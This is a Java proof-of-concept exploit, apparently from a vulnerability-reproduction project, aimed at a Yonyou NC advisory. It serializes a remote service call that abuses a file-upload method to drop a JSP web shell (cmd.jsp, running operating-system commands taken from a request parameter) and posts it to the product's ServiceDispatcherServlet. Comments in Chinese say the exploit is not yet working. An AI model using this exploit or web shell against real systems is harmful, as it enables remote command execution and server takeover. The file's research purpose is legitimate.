package cve.nc;


import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import nc.bs.framework.common.InvocationInfo;

import nc.bs.framework.comn.NetObjectOutputStream;

import nc.vo.pubapp.remoteservice.RemoteTransParamsVO;

import org.apache.http.client.methods.HttpPost;
import java.io.*;

/**
 * 漏洞：
 * https://security.yonyou.com/#/noticeInfo?id=439
 *
 * 该漏洞尚未复现成功
 */
public class GetImplClassImpl_fileupload {

    public static InvocationInfo makeInvocationInfo() throws Exception {
        String module = "pubapp";
        String serviceName = "nc.itf.pubapp.remoteservice.IGetImplClass";
        String methodName = "getResult";
        Class[] parameterTypes = {RemoteTransParamsVO.class};

        byte[] bytes = "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>".getBytes();

        RemoteTransParamsVO remoteTransParamsVO = new RemoteTransParamsVO();
        remoteTransParamsVO.setMoudle("baseapp");
        remoteTransParamsVO.setImpclassname("FileManagerImpl");
        remoteTransParamsVO.setMethodname("upLoadFile");
        remoteTransParamsVO.setMethodparameterTypes(new Class[]{String.class, byte[].class});
        remoteTransParamsVO.setArgs(new Object[]{"cmd.jsp",bytes});


        Object[] parameters = {remoteTransParamsVO};
        String clientHost = "127.0.0.1";

        InvocationInfo invocationInfo = new InvocationInfo(module, serviceName, methodName, parameterTypes, parameters, clientHost);

        return invocationInfo;
    }
    // TODO 尚未成功，待完善
    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201/ServiceDispatcherServlet";

        InvocationInfo invocationInfo = makeInvocationInfo();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        NetObjectOutputStream.writeObject(bos, invocationInfo);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bos.toByteArray());


    }
}
